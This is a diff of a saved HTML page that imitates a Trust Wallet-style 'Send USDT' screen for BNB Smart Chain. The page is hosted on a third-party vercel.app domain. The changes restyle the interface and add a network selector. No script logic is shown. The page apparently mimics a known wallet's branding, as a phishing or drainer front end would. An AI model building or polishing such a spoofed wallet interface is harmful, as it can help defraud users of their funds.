@@ -2,73 +2,11 @@
 <html data-scrapbook-source="https://transfer-trust-wallet.vercel.app/" data-scrapbook-create="20250612175515756" data-scrapbook-title="Transfer Trust Wallet">
 <head>
   <meta charset="UTF-8">
-  <title>Transfer USDT</title>
-  <meta name="description" content="Securely transfer USDT">
+  <title>Transfer Trust Wallet</title>
+  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" href="favicon.ico">
-
-  <!-- ORIGINAL CSS -->
   <link rel="stylesheet" href="style.css">
-
-  <style>
-    /* ===============================
-       UI POLISH ONLY – LOGIC UNTOUCHED
-       =============================== */
-
-    body {
-      background: linear-gradient(180deg, #181818, #0f0f0f) !important;
-    }
-
-    .min-h-screen {
-      padding-bottom: 120px !important;
-    }
-
-    header h1 {
-      font-size: 20px !important;
-      font-weight: 600 !important;
-      letter-spacing: 0.2px;
-    }
-
-    label {
-      font-size: 14px !important;
-      color: #9a9a9a !important;
-    }
-
-    input {
-      border-radius: 14px !important;
-      background-color: #1a1a1a !important;
-      border-color: #2a2a2a !important;
-      font-text-size-adjust: none;
-      font-size: 16px !important;
-    }
-
-    input::placeholder {
-      color: #8b8b8b !important;
-    }
-
-    .text-greentext {
-      color: #3ddc84 !important;
-      font-weight: 500 !important;
-    }
-
-    .text-xs.text-gray-500 {
-      font-size: 14px !important;
-      color: #9a9a9a !important;
-    }
-
-    .fixed.bottom-8 button {
-      height: 54px !important;
-      border-radius: 999px !important;
-      font-size: 18px !important;
-      font-weight: 600 !important;
-      background: #2e7d4f !important;
-      color: #0d1b12 !important;
-    }
-
-    .fixed.bottom-8 button:disabled {
-      opacity: 0.6 !important;
-    }
-  </style>
 </head>
 
 <body>
@@ -77,32 +15,43 @@
       <div class="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
 
         <header class="flex w-full items-center mb-8">
-          <h1 class="flex-1 text-center text-white">Send USDT</h1>
+          <h1 class="flex-1 text-center text-xl font-medium text-white">
+            Send USDT
+          </h1>
         </header>
 
         <div class="space-y-6">
+
+          <!-- Address -->
           <div class="space-y-1">
-            <label>Address or Domain Name</label>
+            <label class="text-sm text-gray-400">Address or Domain Name</label>
             <div class="relative">
               <input
                 placeholder="Search or Enter"
                 class="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32"
-                value=""
               >
               <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
-                <button class="text-greentext h-8 px-2 hover:text-emerald-400">Paste</button>
-                <button class="text-greentext h-8 w-8 hover:text-emerald-400">
-                  📄
-                </button>
-                <button class="text-greentext h-8 w-8 hover:text-emerald-400">
-                  📷
-                </button>
+                <button class="text-greentext h-8 px-2">Paste</button>
+                <button class="text-greentext h-8 w-8">📄</button>
+                <button class="text-greentext h-8 w-8">📷</button>
               </div>
             </div>
           </div>
 
+          <!-- ✅ ADDED SECTION (ONLY THIS PART IS NEW) -->
           <div class="space-y-1">
-            <label>Amount</label>
+            <label class="text-sm text-gray-400">Destination network</label>
+            <div class="inline-flex items-center gap-2 rounded-full border border-gray-800 bg-[#1b1b1b] px-4 py-2 text-sm text-gray-300">
+              <span>🟡</span>
+              <span>BNB Smart Chain</span>
+              <span class="ml-1">▾</span>
+            </div>
+          </div>
+          <!-- ✅ END ADDED SECTION -->
+
+          <!-- Amount -->
+          <div class="space-y-1">
+            <label class="text-sm text-gray-400">Amount</label>
             <div class="relative">
               <input
                 placeholder="USDT Amount"
@@ -111,7 +60,7 @@
               >
               <div class="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
                 <span class="text-gray-500 text-sm mr-2">USDT</span>
-                <button class="text-greentext h-8 hover:text-emerald-400">Max</button>
+                <button class="text-greentext h-8">Max</button>
               </div>
             </div>
           </div>
@@ -120,7 +69,9 @@
         </div>
 
         <div class="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
-          <button class="w-full rounded-full h-12 text-lg" disabled>Next</button>
+          <button class="w-full bg-greentext text-black rounded-full h-12 text-lg" disabled>
+            Next
+          </button>
         </div>
 
       </div>
@@ -141,3 +92,4 @@
   <script src="main.js"></script>
 </body>
 </html>
+
